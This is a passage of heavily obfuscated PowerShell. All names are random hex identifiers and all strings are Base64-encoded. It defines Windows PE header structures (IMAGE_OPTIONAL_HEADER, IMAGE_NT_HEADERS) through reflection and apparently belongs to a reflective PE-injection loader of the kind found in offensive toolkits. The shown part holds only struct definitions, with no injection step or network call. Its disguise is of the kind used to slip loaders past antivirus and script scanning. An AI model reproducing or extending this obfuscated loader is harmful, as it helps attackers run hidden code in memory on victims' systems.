		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(108) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(224) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(232) | Out-Null
		${bbb4b1eaa32a46fd8d6d446ba9b46df5} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${bbb4b1eaa32a46fd8d6d446ba9b46df5}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIAMwAyAA=='))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 224)
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${25131369361d43dc8654a88fe9f879cf}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(28) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${41668aabe6d444c3a0f04c3ab231fdf8}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${2a3382eabcf54f4883ecb89229db7085}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(76) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(84) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(92) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${efe52fb6628d4bb4ac2d0aa0fddcd39c}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		${11ee5c280b4b4c908e776fc942271fb9} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${11ee5c280b4b4c908e776fc942271fb9}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwA2ADQA'))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 264)
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${3d9691ca995a4dc0934eb813bd1040ec}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${bbb4b1eaa32a46fd8d6d446ba9b46df5}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${99d74915817c46639cbad60e85a8419b} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${99d74915817c46639cbad60e85a8419b}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwAzADIA'))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 248)
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${3d9691ca995a4dc0934eb813bd1040ec}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
